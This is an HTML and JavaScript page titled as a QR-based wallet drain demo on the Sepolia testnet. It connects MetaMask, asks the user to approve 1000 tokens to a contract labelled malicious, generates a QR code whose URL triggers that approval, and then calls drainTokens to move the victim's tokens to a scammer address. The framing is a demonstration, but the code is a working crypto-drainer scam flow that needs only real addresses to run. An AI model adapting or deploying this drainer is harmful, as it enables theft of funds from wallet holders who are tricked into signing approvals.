<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR Scam Demo with QR Code</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.2.0/web3.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        button { padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; }
        #status { color: red; margin-top: 20px; }
        #qrcode { margin-top: 20px; }
    </style>
</head>
<body>
    <h1>QR-Based Wallet Drain Demo (Sepolia Testnet)</h1>
    <p>Connect to Sepolia Testnet and try the scam simulation.</p>
    <button onclick="connectWallet()">Connect MetaMask</button>
    <button onclick="approveTokens()">Claim Airdrop (Approve Tokens)</button>
    <button onclick="generateQRCode()">Generate Malicious QR Code</button>
    <button onclick="drainTokens()">Simulate Scam (Drain Tokens)</button>
    <p id="status"></p>
    <div id="qrcode"></div>

    <script>
        let web3;
        let accounts;
        let tokenContract;
        let maliciousContract;

        // Replace with your deployed contract addresses (Sepolia Testnet)
        const TOKEN_ADDRESS = "YOUR_TEST_TOKEN_ADDRESS"; // Deploy TestToken.sol first
        const MALICIOUS_ADDRESS = "YOUR_MALICIOUS_CONTRACT_ADDRESS"; // Deploy MaliciousContract.sol
        const SCAMMER_ADDRESS = "0xYourScammerAddress"; // Any test address for simulation

        // TestToken ABI (simplified for approve function)
        const TOKEN_ABI = [
            {
                "constant": false,
                "inputs": [
                    { "name": "spender", "type": "address" },
                    { "name": "amount", "type": "uint256" }
                ],
                "name": "approve",
                "outputs": [{ "name": "", "type": "bool" }],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [
                    { "name": "owner", "type": "address" },
                    { "name": "spender", "type": "address" }
                ],
                "name": "allowance",
                "outputs": [{ "name": "", "type": "uint256" }],
                "type": "function"
            }
        ];

        // MaliciousContract ABI (for drainTokens function)
        const MALICIOUS_ABI = [
            {
                "constant": false,
                "inputs": [
                    { "name": "tokenAddress", "type": "address" },
                    { "name": "victim", "type": "address" },
                    { "name": "to", "type": "address" },
                    { "name": "amount", "type": "uint256" }
                ],
                "name": "drainTokens",
                "outputs": [],
                "type": "function"
            }
        ];

        // Connect to MetaMask
        async function connectWallet() {
            if (window.ethereum) {
                try {
                    web3 = new Web3(window.ethereum);
                    accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    tokenContract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS);
                    maliciousContract = new web3.eth.Contract(MALICIOUS_ABI, MALICIOUS_ADDRESS);
                    document.getElementById('status').innerText = `Connected: ${accounts[0]}`;
                } catch (error) {
                    document.getElementById('status').innerText = `Error: ${error.message}`;
                }
            } else {
                document.getElementById('status').innerText = "Please install MetaMask!";
            }
        }

        // Approve tokens to malicious contract
        async function approveTokens() {
            if (!accounts) {
                document.getElementById('status').innerText = "Connect wallet first!";
                return;
            }
            try {
                const amount = web3.utils.toWei("1000", "ether"); // Approving 1000 tokens
                await tokenContract.methods.approve(MALICIOUS_ADDRESS, amount).send({ from: accounts[0] });
                document.getElementById('status').innerText = "Tokens approved for malicious contract!";
            } catch (error) {
                document.getElementById('status').innerText = `Error: ${error.message}`;
            }
        }

        // Generate Malicious QR Code
        function generateQRCode() {
            if (!accounts) {
                document.getElementById('status').innerText = "Connect wallet first!";
                return;
            }
            // URL to trigger approval (simulates malicious dApp)
            const maliciousUrl = `https://your-hosted-domain.com/?contract=${MALICIOUS_ADDRESS}&token=${TOKEN_ADDRESS}&amount=${web3.utils.toWei("1000", "ether")}`;
            document.getElementById('qrcode').innerHTML = ""; // Clear previous QR code
            new QRCode(document.getElementById("qrcode"), {
                text: maliciousUrl,
                width: 200,
                height: 200
            });
            document.getElementById('status').innerText = "Malicious QR Code generated! Scan it with MetaMask to approve tokens.";
        }

        // Simulate scammer draining tokens
        async function drainTokens() {
            if (!accounts) {
                document.getElementById('status').innerText = "Connect wallet first!";
                return;
            }
            try {
                const amount = web3.utils.toWei("500", "ether"); // Draining 500 tokens
                await maliciousContract.methods.drainTokens(TOKEN_ADDRESS, accounts[0], SCAMMER_ADDRESS, amount).send({ from: SCAMMER_ADDRESS });
                document.getElementById('status').innerText = "Tokens drained to scammer address!";
            } catch (error) {
                document.getElementById('status').innerText = `Error: ${error.message}`;
            }
        }
    </script>
</body>
</html>
